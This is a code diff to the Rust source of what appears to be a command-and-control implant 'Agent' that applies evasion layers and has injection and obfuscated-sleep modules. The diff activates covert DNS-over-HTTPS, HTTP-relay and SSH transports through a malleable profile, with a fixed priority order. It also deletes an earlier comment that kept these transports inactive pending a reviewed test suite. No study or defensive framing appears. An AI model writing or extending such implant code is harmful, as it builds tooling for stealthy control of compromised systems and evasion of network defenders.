@@ -223,26 +223,74 @@ impl Agent {
             log::debug!("Evasion layers applied");
         }
 
-        // Warn when experimental transports are configured but the corresponding
-        // feature flag is not compiled in.
+        // Startup transport selection is feature-gated and profile-driven.
+        // Effective priority matches outbound startup selection:
+        // SSH > DoH > HTTP > TLS fallback.
+        //
+        // `outbound::build_outbound_transport` performs the concrete transport
+        // construction; this block documents and validates the same runtime
+        // decisions from the active malleable profile.
         {
-            #[allow(unused_variables)]
             let cfg = self.config.lock().await;
+            let profile = &cfg.malleable_profile;
+
+            #[cfg(feature = "ssh-transport")]
+            let ssh_selected = profile
+                .ssh_host
+                .as_deref()
+                .filter(|s| !s.is_empty())
+                .is_some();
+            #[cfg(not(feature = "ssh-transport"))]
+            let ssh_selected = false;
+
+            #[cfg(feature = "doh-transport")]
+            let doh_selected = !ssh_selected && profile.dns_over_https;
             #[cfg(not(feature = "doh-transport"))]
-            if cfg.malleable_profile.dns_over_https {
+            let doh_selected = false;
+
+            #[cfg(feature = "http-transport")]
+            let http_selected = !ssh_selected && !doh_selected && profile.cdn_relay;
+            #[cfg(not(feature = "http-transport"))]
+            let http_selected = false;
+
+            if ssh_selected {
+                info!("startup transport profile preference: SSH (priority=1)");
+            } else if doh_selected {
+                info!("startup transport profile preference: DoH (priority=2)");
+            } else if http_selected {
+                info!("startup transport profile preference: HTTP (priority=3)");
+            } else {
+                info!("startup transport profile preference: TLS (priority=4 fallback)");
+            }
+
+            #[cfg(not(feature = "ssh-transport"))]
+            if profile
+                .ssh_host
+                .as_deref()
+                .filter(|s| !s.is_empty())
+                .is_some()
+            {
+                log::warn!(
+                    "ssh_host is configured in the malleable profile but the `ssh-transport` \
+                     feature is not compiled in. SSH branch is skipped."
+                );
+            }
+
+            #[cfg(not(feature = "doh-transport"))]
+            if profile.dns_over_https {
                 log::warn!(
                     "dns_over_https=true in config but the `doh-transport` feature is not \
-                     compiled in. Traffic still uses the default TLS transport. \
+                     compiled in. DoH branch is skipped in startup transport selection. \
                      Rebuild with --features doh-transport to enable DohTransport. \
                      NOTE: a server-side DoH listener is required and is not included \
                      in this release."
                 );
             }
             #[cfg(not(feature = "http-transport"))]
-            if cfg.malleable_profile.cdn_relay {
+            if profile.cdn_relay {
                 log::warn!(
                     "cdn_relay=true in config but the `http-transport` feature is not \
-                     compiled in. Traffic still uses the default TLS transport. \
+                     compiled in. HTTP branch is skipped in startup transport selection. \
                      Rebuild with --features http-transport to enable HttpTransport."
                 );
             }
@@ -393,20 +441,12 @@ pub mod injection;
 
 pub mod obfuscated_sleep;
 
-/// EXPERIMENTAL — inactive transport modules.
+/// Optional covert transport modules.
 ///
-/// `c2_doh` and `c2_http` are prototype implementations of DNS-over-HTTPS
-/// and HTTP malleable-profile transports respectively.  **Neither module is
-/// wired into the default startup path** (`Agent::run`); the agent always
-/// uses the default TLS transport at runtime.
+/// `c2_doh` and `c2_http` are activated only when BOTH are true:
+/// 1) the corresponding Cargo feature is compiled in, and
+/// 2) the malleable profile enables that transport at runtime.
 ///
-/// These modules are compiled in unconditionally so that CI catches type
-/// errors, but they do nothing unless explicitly integrated.  At runtime,
-/// if the operator sets `dns_over_https = true` or `cdn_relay = true` in the
-/// malleable profile, the agent emits a `log::warn!` and continues using the
-/// TLS transport — it does NOT activate `DohTransport` or `HttpTransport`.
-///
-/// Do not add code here that activates these transports without a full
-/// reviewed test suite covering the network startup path.
+/// Startup transport priority is: SSH > DoH > HTTP > TLS fallback.
 pub mod c2_doh;
 pub mod c2_http;
